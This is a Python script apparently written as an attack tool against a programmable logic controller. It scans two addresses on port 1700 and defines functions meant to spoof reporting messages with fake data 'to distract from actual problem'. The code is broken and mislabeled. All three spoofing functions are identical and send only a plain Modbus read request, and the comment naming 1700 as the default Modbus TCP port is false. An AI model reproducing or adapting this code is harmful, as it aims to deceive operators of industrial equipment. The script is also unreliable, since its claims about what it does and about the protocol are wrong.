import socket
import struct
import time
import random

# Define the IP address of the PLC
plc_ip = None

# Function to find the PLC's IP address if it's not known
def find_plc_ip():
    # This could involve scanning the network or using a discovery protocol
    # For simplicity, let's assume you have a list of potential IPs
    potential_ips = ['192.168.1.1', '192.168.1.2']
    for ip in potential_ips:
        # Send a discovery packet and check for a response
        # This step is highly dependent on the specific protocol and device
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, 1700))  # 1700 is the default port for Modbus TCP
            if result == 0:
                return ip
            sock.close()
        except socket.error:
            pass
    return None

# Function to spoof a reporting message
def spoof_reporting_message():
    global plc_ip
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Define the Modbus function code for reading holding registers
        function_code = 0x03
        
        # Define the address of the register to read
        register_address = 0x0000
        
        # Define the number of registers to read
        num_registers = 0x0005
        
        # Create a Modbus TCP packet
        packet = bytearray()
        packet.append(0x00)  # Transaction ID
        packet.append(0x00)
        packet.append(0x00)  # Protocol ID
        packet.append(0x00)
        packet.append(0x00)  # Length
        packet.append(0x06)
        packet.append(0x01)  # Unit ID
        packet.append(function_code)  # Function code
        packet.append(register_address >> 8)  # Register address
        packet.append(register_address & 0xFF)
        packet.append(num_registers >> 8)  # Number of registers
        packet.append(num_registers & 0xFF)
        
        # Create a socket object
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Set a timeout to avoid waiting indefinitely
        sock.settimeout(1)
        
        # Try to connect to the PLC
        try:
            sock.connect((plc_ip, 1700))
            print("Connected to the PLC")
            
            # Send the packet
            sock.sendall(packet)
            
            # Receive the response
            response = sock.recv(1024)
            print("Received response:", response)
        except socket.error as e:
            print("Failed to connect to the PLC:", str(e))
        finally:
            # Close the socket
            sock.close()
    else:
        print("PLC IP address not found")

# Function to spoof a reporting message with fake data
def spoof_reporting_message_fake_data():
    global plc_ip
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Define the Modbus function code for reading holding registers
        function_code = 0x03
        
        # Define the address of the register to read
        register_address = 0x0000
        
        # Define the number of registers to read
        num_registers = 0x0005
        
        # Create a Modbus TCP packet with fake data
        packet = bytearray()
        packet.append(0x00)  # Transaction ID
        packet.append(0x00)
        packet.append(0x00)  # Protocol ID
        packet.append(0x00)
        packet.append(0x00)  # Length
        packet.append(0x06)
        packet.append(0x01)  # Unit ID
        packet.append(function_code)  # Function code
        packet.append(register_address >> 8)  # Register address
        packet.append(register_address & 0xFF)
        packet.append(num_registers >> 8)  # Number of registers
        packet.append(num_registers & 0xFF)
        
        # Create a socket object
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Set a timeout to avoid waiting indefinitely
        sock.settimeout(1)
        
        # Try to connect to the PLC
        try:
            sock.connect((plc_ip, 1700))
            print("Connected to the PLC")
            
            # Send the packet
            sock.sendall(packet)
            
            # Receive the response
            response = sock.recv(1024)
            print("Received response:", response)
        except socket.error as e:
            print("Failed to connect to the PLC:", str(e))
        finally:
            # Close the socket
            sock.close()
    else:
        print("PLC IP address not found")

# Function to spoof a reporting message with fake data to distract from actual problem
def spoof_reporting_message_distract():
    global plc_ip
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Define the Modbus function code for reading holding registers
        function_code = 0x03
        
        # Define the address of the register to read
        register_address = 0x0000
        
        # Define the number of registers to read
        num_registers = 0x0005
        
        # Create a Modbus TCP packet with fake data to distract from actual problem
        packet = bytearray()
        packet.append(0x00)  # Transaction ID
        packet.append(0x00)
        packet.append(0x00)  # Protocol ID
        packet.append(0x00)
        packet.append(0x00)  # Length
        packet.append(0x06)
        packet.append(0x01)  # Unit ID
        packet.append(function_code)  # Function code
        packet.append(register_address >> 8)  # Register address
        packet.append(register_address & 0xFF)
        packet.append(num_registers >> 8)  # Number of registers
        packet.append(num_registers & 0xFF)
        
        # Create a socket object
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Set a timeout to avoid waiting indefinitely
        sock.settimeout(1)
        
        # Try to connect to the PLC
        try:
            sock.connect((plc_ip, 1700))
            print("Connected to the PLC")
            
            # Send the packet
            sock.sendall(packet)
            
            # Receive the response
            response = sock.recv(1024)
            print("Received response:", response)
        except socket.error as e:
            print("Failed to connect to the PLC:", str(e))
        finally:
            # Close the socket
            sock.close()
    else:
        print("PLC IP address not found")

# Main function to start the spoofing of reporting messages
def main():
    global plc_ip
    plc_ip = find_plc_ip()
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Spoof a reporting message
        spoof_reporting_message()
        
        # Spoof a reporting message with fake data
        spoof_reporting_message_fake_data()
        
        # Spoof a reporting message with fake data to distract from actual problem
        spoof_reporting_message_distract()
    else:
        print("PLC IP address not found")

if __name__ == "__main__":
    main()